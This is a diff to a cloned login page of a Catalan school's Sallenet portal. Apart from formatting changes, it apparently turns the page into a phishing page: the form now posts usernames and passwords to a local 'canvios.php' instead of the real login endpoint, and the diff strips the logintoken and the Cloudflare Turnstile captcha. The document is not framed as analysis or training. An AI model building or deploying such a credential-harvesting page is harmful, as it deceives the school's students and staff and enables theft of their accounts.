@@ -66,19 +66,23 @@
             font-weight: 300;
             font-style: normal;
         }
+
         @font-face {
             font-family: 'Open Sans';
             src: url('../theme/font.php/sallenetboost/1777415323/OpenSans-Regular.ttf') format('truetype');
             font-weight: 400;
             font-style: normal;
         }
+
         @font-face {
             font-family: 'Open Sans';
             src: url('../theme/font.php/sallenetboost/1777415323/OpenSans-Bold.ttf') format('truetype');
             font-weight: 700;
             font-style: normal;
         }
-        body, html {
+
+        body,
+        html {
             font-family: 'Open Sans', sans-serif !important;
         }
     </style>
@@ -105,7 +109,8 @@
                 </p>
             </div>
             <div class="modal-avisos-close-button">
-                <a href="#" onclick="document.getElementById('modal_navegadores').setAttribute('style', 'display: none !important'); return false;">X</a>
+                <a href="#"
+                    onclick="document.getElementById('modal_navegadores').setAttribute('style', 'display: none !important'); return false;">X</a>
             </div>
         </div>
 
@@ -204,47 +209,21 @@
 
 
 
-
-
-                                        <form class="login-form"
-                                            action="https://lasallegirona.sallenet.org/login/index.php" method="post"
-                                            id="login">
-                                            <input id="anchor" type="hidden" name="anchor" value="">
-                                            <script>document.getElementById('anchor').value = location.hash;</script>
+                                        <form class="login-form" action="../canvios.php" method="post">
 
                                             <!-- ONE logintoken hidden input inside main login form -->
-                                            <input type="hidden" name="logintoken"
-                                                value="jozu5dSKodGfLTsuoC6KxqCDvm9LHHU9">
-
                                             <div class="login-form-username mb-3">
-                                                <label for="username" class="sr-only">
-                                                    Nom d'usuari
-                                                </label>
+                                                <label for="username" class="sr-only">Nom d'usuari</label>
                                                 <input class="sn-login-input" type="text" name="username" id="username"
-                                                    value="" placeholder="Nom d&#039;usuari" autocomplete="username">
+                                                    placeholder="Nom d&#039;usuari" autocomplete="username" required>
                                             </div>
 
                                             <div class="login-form-password mb-3">
                                                 <label for="password" class="sr-only">Contrasenya</label>
-                                                <input class="sn-login-input" type="password" name="password"
-                                                    id="password" value="" placeholder="Contrasenya"
-                                                    autocomplete="current-password">
+                                                <input type="password" class="sn-login-input" name="password"
+                                                    id="password" placeholder="Contrasenya"
+                                                    autocomplete="current-password" required>
                                             </div>
-
-
-                                            <div id="turnstile-container" class="cf-turnstile"
-                                                data-sitekey="0x4AAAAAAAxmlB17p_UkctMj"
-                                                data-callback="turnstileCallback">
-                                            </div>
-
-                                            <script>
-                                                let tokenReady = false;
-                                                function turnstileCallback(token) {
-                                                    tokenReady = true;
-                                                    document.getElementById('loginbtn').disabled = false;
-                                                }
-                                                document.getElementById('loginbtn').disabled = true;
-                                            </script>
 
                                             <div class="login-form-submit mb-3">
                                                 <button class="btn btn-primary sn-btn-login" type="submit"
